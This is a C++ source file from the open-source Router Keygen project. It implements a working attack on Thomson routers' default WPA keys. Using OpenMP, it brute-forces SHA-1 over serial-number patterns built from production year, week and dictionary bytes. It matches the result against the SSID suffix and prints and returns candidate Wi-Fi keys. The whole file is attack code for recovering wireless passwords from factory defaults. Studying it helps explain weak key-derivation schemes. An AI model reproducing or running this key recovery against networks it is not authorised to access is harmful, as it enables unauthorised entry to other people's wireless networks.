/*
 * Copyright 2012 Rui Araújo, Luís Fonseca
 *
 * This file is part of Router Keygen.
 *
 * Router Keygen is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Router Keygen is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with Router Keygen.  If not, see <http://www.gnu.org/licenses/>.
 */
#include "thomsonkeygen.h"
#include "unknown.h"
#include <stdio.h>
#include <omp.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <cstdlib>
#include <stdint.h>
#include <QFile>
#include <QDataStream>
#include <QIODevice>

ThomsonKeygen::ThomsonKeygen(QString & ssid, QString & mac, int level,
		QString enc) :
		Keygen(ssid, mac, level, enc) {
}

QVector<QString> & ThomsonKeygen::getKeys() {
	uint32_t essid = 0, ptrValue;
	const int n = sizeof(dic) / sizeof("AAA");
	bool status = false;
	essid = getSsidName().right(6).toInt(&status, 16);
	if (!status)
		throw ERROR;

	uint8_t message_digest[20];
	SHA_CTX sha1;
	int year = 4;
	int week = 1;
	int i = 0;
	char input[13];
	char key[11];
	input[0] = 'C';
	input[1] = 'P';
#pragma omp parallel for firstprivate(input, message_digest, key,  sha1, year, week, essid, ptrValue )
	for (i = 0; i < n; ++i) {

		sprintf(input + 6, "%02X%02X%02X", (int) dic[i][0], (int) dic[i][1],
				(int) dic[i][2]);
		for (year = 4; year <= 12; ++year) {
			for (week = 1; week <= 52; ++week) {
				input[2] = '0' + year / 10;
				input[3] = '0' + year % 10;
				input[4] = '0' + week / 10;
				input[5] = '0' + week % 10;
				SHA1_Init(&sha1);
				SHA1_Update(&sha1, (const void *) input, 12);
				SHA1_Final(message_digest, &sha1);

				/*
				 * We have to this because of little endianess
				 */
				uint32_t * ptr = &ptrValue;
				memcpy(((uint8_t *) ptr), message_digest + 19, 1);
				memcpy(((uint8_t *) ptr) + 1, message_digest + 18, 1);
				memcpy(((uint8_t *) ptr) + 2, message_digest + 17, 1);

				if ((*ptr) == essid) {

#pragma omp critical
					{
						printf("Possibility: Year - %d\tWeek: %d\n",
								2000 + year, week);
						printf("XXX: %s\n", dic[i]);
						printf("ESSID: Thomson%02X%02X%02X\t",
								message_digest[17], message_digest[18],
								message_digest[19]);
						printf("KEY: %02X%02X%02X%02X%02X\t INPUT:%s\n",
								message_digest[0], message_digest[1],
								message_digest[2], message_digest[3],
								message_digest[4], input);
						sprintf(key, "%02X%02X%02X%02X%02X", message_digest[0],
								message_digest[1], message_digest[2],
								message_digest[3], message_digest[4]);
						results.append(QString(key));
					}
				}

			}
		}
	}
#pragma omp barrier

	return results;
}
